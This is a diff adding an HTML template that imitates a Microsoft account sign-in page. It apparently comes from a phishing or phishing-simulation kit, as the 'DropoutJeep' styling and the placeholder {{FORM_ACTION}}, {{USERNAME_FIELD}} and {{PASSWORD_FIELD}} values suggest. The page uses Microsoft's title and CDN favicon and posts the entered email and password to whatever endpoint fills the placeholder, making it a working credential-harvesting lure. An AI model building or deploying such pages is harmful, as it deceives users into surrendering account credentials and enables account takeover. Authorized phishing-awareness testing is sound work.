@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sign in to your Microsoft account</title>
+
+<style>
+:root {
+  --dj-primary: #2563eb;
+  --dj-primary-hover: #1e40af;
+  --dj-accent: #2563eb;
+  --dj-page-bg: #f3f4f6;
+  --dj-card-bg: #ffffff;
+  --dj-card-border: #e5e7eb;
+  --dj-text: #1f2937;
+  --dj-text-muted: #6b7280;
+  --dj-text-subtle: #9ca3af;
+  --dj-input-bg: #ffffff;
+  --dj-input-border: #d1d5db;
+  --dj-input-focus-border: #2563eb;
+  --dj-input-focus-bg: #ffffff;
+  --dj-input-text: #1f2937;
+  --dj-input-placeholder: #9ca3af;
+  --dj-divider: #e5e7eb;
+  --dj-btn-text: #ffffff;
+  --dj-btn-hover-scale: 1.01;
+}
+html, body {
+  margin: 0; padding: 0; height: 100%;
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  background-color: var(--dj-page-bg); color: var(--dj-text);
+  -webkit-font-smoothing: antialiased;
+}
+body { display: flex; align-items: center; justify-content: center; }
+.dj-container { width: 100%; max-width: 440px; margin: 16px; }
+.dj-card {
+  background: var(--dj-card-bg); border: 1px solid var(--dj-card-border);
+  border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08), 0 2px 6px rgba(0,0,0,0.04); overflow: hidden;
+  
+}
+.dj-panel-right {}
+.dj-logo { max-height: 64px; max-width: 200px; margin: 0 auto 24px; display: block; }
+.dj-brand-name { font-size: 32px; font-weight: 800; letter-spacing: -0.03em; margin: 0 0 8px; font-family: sans-serif; }
+.dj-brand-primary { color: var(--dj-primary); }
+.dj-brand-secondary { color: var(--dj-text); }
+.dj-tagline { font-size: 13px; text-transform: uppercase; letter-spacing: 0.2em; color: var(--dj-text-muted); margin: 0 0 32px; }
+.dj-cta-box { padding: 20px 24px; border-radius: 16px; border: 1px solid var(--dj-card-border); background: rgba(255,255,255,0.02); text-align: center; }
+.dj-cta-muted { font-size: 14px; color: var(--dj-text-muted); margin: 0 0 4px; }
+.dj-cta-strong { font-size: 18px; font-weight: 600; color: var(--dj-text); margin: 0; }
+.dj-cta-accent { color: var(--dj-primary); font-weight: 700; }
+.dj-title { font-size: 22px; font-weight: 700; margin: 0 0 6px; color: var(--dj-text); }
+.dj-subtitle { font-size: 15px; color: var(--dj-text-muted); margin: 0 0 28px; }
+.dj-form { display: flex; flex-direction: column; gap: 16px; }
+.dj-field { display: flex; flex-direction: column; gap: 6px; }
+.dj-label { font-size: 13px; font-weight: 500; color: var(--dj-text-muted); margin-left: 4px; }
+.dj-input-wrap { position: relative; display: flex; align-items: center; }
+.dj-input-icon { position: absolute; left: 14px; width: 16px; height: 16px; color: var(--dj-input-placeholder); pointer-events: none; transition: color 0.15s; }
+.dj-input-wrap:focus-within .dj-input-icon { color: var(--dj-text-muted); }
+.dj-input {
+  width: 100%; padding: 14px 14px 14px 42px; font-size: 15px;
+  background: var(--dj-input-bg); border: 1px solid var(--dj-input-border);
+  border-radius: 12px; color: var(--dj-input-text); outline: none;
+  transition: border-color 0.15s, background 0.15s, box-shadow 0.15s; box-sizing: border-box;
+}
+.dj-input::placeholder { color: var(--dj-input-placeholder); }
+.dj-input:focus { border-color: var(--dj-input-focus-border); background: var(--dj-input-focus-bg); box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+.dj-row { display: flex; align-items: center; justify-content: space-between; padding-top: 4px; }
+.dj-checkbox-label { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--dj-text-muted); cursor: pointer; user-select: none; }
+.dj-checkbox { width: 16px; height: 16px; border-radius: 4px; accent-color: var(--dj-primary); cursor: pointer; }
+.dj-link { font-size: 13px; color: var(--dj-text-muted); text-decoration: none; transition: color 0.15s; }
+.dj-link:hover { color: var(--dj-text); }
+.dj-button {
+  width: 100%; padding: 14px 16px; font-size: 15px; font-weight: 600;
+  color: var(--dj-btn-text); background: linear-gradient(135deg, var(--dj-primary), var(--dj-primary-hover));
+  border: none; border-radius: 12px; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: transform 0.15s, filter 0.15s, box-shadow 0.15s; margin-top: 4px;
+}
+.dj-button:hover { transform: scale(var(--dj-btn-hover-scale)); filter: brightness(1.1); box-shadow: 0 4px 15px rgba(37,99,235,0.3); }
+.dj-btn-arrow { width: 18px; height: 18px; }
+.dj-divider { display: flex; align-items: center; gap: 16px; margin: 8px 0; }
+.dj-divider::before, .dj-divider::after { content: ""; flex: 1; height: 1px; background: var(--dj-divider); }
+.dj-divider span { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--dj-text-subtle); font-weight: 500; }
+.dj-sso-button {
+  width: 100%; padding: 14px 16px; font-size: 14px; font-weight: 500; color: var(--dj-text-subtle);
+  background: rgba(255,255,255,0.01); border: 1px solid rgba(255,255,255,0.04);
+  border-radius: 12px; cursor: not-allowed; display: flex; align-items: center; justify-content: center; gap: 8px;
+}
+.dj-sso-button svg { width: 18px; height: 18px; }
+.dj-footer { text-align: center; margin-top: 32px; font-size: 11px; color: var(--dj-text-subtle); }
+.dj-disclaimer {
+  display: flex; align-items: flex-start; gap: 8px; padding: 12px 14px;
+  border-radius: 12px; border: 1px solid #fecaca; background: #fef2f2;
+  margin-top: 32px; font-size: 12px; line-height: 1.5; color: #7f1d1d;
+}
+.dj-disclaimer svg { flex-shrink: 0; width: 16px; height: 16px; margin-top: 1px; color: #ef4444; }
+
+body{display:none;}
+
+body{display:block !important;}
+
+/* DropoutJeep dynamic layer */
+@keyframes dj-fade-in { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes dj-pulse { 0%,100% { opacity: 1; } 50% { opacity: .6; } }
+@keyframes dj-spin { to { transform: rotate(360deg); } }
+.dj-animate-in { animation: dj-fade-in .55s cubic-bezier(.22,.61,.36,1) both; }
+.dj-delay-1 { animation-delay: .08s; }
+.dj-delay-2 { animation-delay: .16s; }
+.dj-delay-3 { animation-delay: .24s; }
+.dj-spinner {
+  width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.35);
+  border-top-color: #fff; border-radius: 50%;
+  animation: dj-spin .8s linear infinite; display: none;
+}
+.dj-submitting .dj-spinner { display: inline-block; }
+.dj-submitting .dj-btn-text { opacity: .85; }
+input[type="text"],input[type="email"],input[type="password"],input[type="tel"] {
+  transition: border-color .2s ease, box-shadow .2s ease, transform .15s ease !important;
+}
+input[type="text"]:focus,input[type="email"]:focus,input[type="password"]:focus,input[type="tel"]:focus {
+  box-shadow: 0 0 0 3px rgba(37,99,235,0.35) !important;
+}
+button[type="submit"],input[type="submit"],.dj-button {
+  transition: transform .15s ease, filter .15s ease, box-shadow .2s ease !important;
+}
+button[type="submit"]:hover,input[type="submit"]:hover,.dj-button:hover {
+  transform: translateY(-1px) scale(1.01) !important;
+  filter: brightness(1.08);
+}
+button[type="submit"]:active,input[type="submit"]:active,.dj-button:active {
+  transform: translateY(0) scale(.99) !important;
+}
+.dj-toggle-pw {
+  position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+  background: none; border: none; color: #6b7280; cursor: pointer; padding: 4px;
+}
+.dj-toggle-pw:hover { color: #111827; }
+.dj-error {
+  background: #fee2e2;
+  color: #991b1b;
+  padding: 10px 12px; border-radius: 8px; font-size: 13px; margin: 8px 0;
+  display: none; animation: dj-fade-in .25s ease;
+}
+.dj-error.visible { display: block; }
+
+</style>
+</head>
+<body>
+<div class="dj-container">
+  <div class="dj-card">
+    <div style="padding:48px 40px">
+      <img src="https://logincdn.msauth.net/16.000.31148.13/images/favicon.ico" alt="Sign in to your Microsoft account" class="dj-logo" />
+      <h1 class="dj-title">Sign in to your Microsoft account</h1>
+      <p class="dj-subtitle">Sign in to continue</p>
+      <form class="dj-form" action="{{FORM_ACTION}}" method="POST" autocomplete="on">
+        <div class="dj-field"><label class="dj-label" for="{{USERNAME_FIELD}}">Email or username</label><div class="dj-input-wrap"><svg class="dj-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect x="2" y="4" width="20" height="16" rx="2"/></svg><input class="dj-input" id="{{USERNAME_FIELD}}" name="{{USERNAME_FIELD}}" type="text" autocomplete="username" placeholder="you@company.com" required /></div></div><div class="dj-field"><label class="dj-label" for="{{PASSWORD_FIELD}}">Password</label><div class="dj-input-wrap"><svg class="dj-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><input class="dj-input" id="{{PASSWORD_FIELD}}" name="{{PASSWORD_FIELD}}" type="password" autocomplete="current-password" placeholder="Enter your password" required /></div></div><div class="dj-row"><label class="dj-checkbox-label"><input type="checkbox" class="dj-checkbox" /><span>Remember me</span></label><a class="dj-link" href="#">Forgot password?</a></div><button class="dj-button" type="submit">Sign in<svg class="dj-btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></button>
+      </form>
+      <p class="dj-footer">&copy; 2026 &mdash; Authorized access only.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  function ready(fn){ if(document.readyState!=='loading') fn(); else document.addEventListener('DOMContentLoaded',fn); }
+  ready(function(){
+    var forms=document.querySelectorAll('form');
+    forms.forEach(function(form){
+      var submitBtn=form.querySelector('button[type="submit"],input[type="submit"]');
+      var spinner=document.createElement('span');
+      spinner.className='dj-spinner';
+      if(submitBtn && !submitBtn.querySelector('.dj-spinner')){
+        var txt=document.createElement('span');
+        txt.className='dj-btn-text';
+        txt.textContent=submitBtn.textContent||submitBtn.value||'';
+        submitBtn.innerHTML='';
+        submitBtn.appendChild(txt);
+        submitBtn.appendChild(spinner);
+      }
+      form.addEventListener('submit', function(e){
+        var user=form.querySelector('input[type="text"],input[type="email"]');
+        var pass=form.querySelector('input[type="password"]');
+        var err=form.querySelector('.dj-error') || document.createElement('div');
+        if(!form.querySelector('.dj-error')){
+          err.className='dj-error';
+          form.insertBefore(err, form.firstChild);
+        }
+        err.classList.remove('visible');
+        var missing=[];
+        if(user && !user.value.trim()) missing.push('username/email');
+        if(pass && !pass.value.trim()) missing.push('password');
+        if(missing.length){
+          e.preventDefault();
+          err.textContent='Please enter your ' + missing.join(' and ') + '.';
+          err.classList.add('visible');
+          return;
+        }
+        if(submitBtn) submitBtn.classList.add('dj-submitting');
+      });
+    });
+    // Password visibility toggles.
+    document.querySelectorAll('input[type="password"]').forEach(function(pw){
+      var wrap=pw.closest('div');
+      if(!wrap) return;
+      wrap.style.position='relative';
+      var btn=document.createElement('button');
+      btn.type='button'; btn.className='dj-toggle-pw'; btn.setAttribute('aria-label','Show password');
+      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>';
+      btn.addEventListener('click',function(){
+        pw.type=pw.type==='password'?'text':'password';
+        btn.setAttribute('aria-label', pw.type==='password'?'Show password':'Hide password');
+      });
+      wrap.appendChild(btn);
+    });
+    // Staggered entrance animation for major containers.
+    var anim=[].slice.call(document.querySelectorAll('.dj-animate-in, form, .dj-card, [class*="card"], [class*="panel"], [class*="login"], [class*="auth"]'));
+    anim.forEach(function(el,i){ el.style.animationDelay=(i*0.05)+'s'; el.classList.add('dj-animate-in'); });
+  });
+})();
+</script>
+
+</body>
+</html>
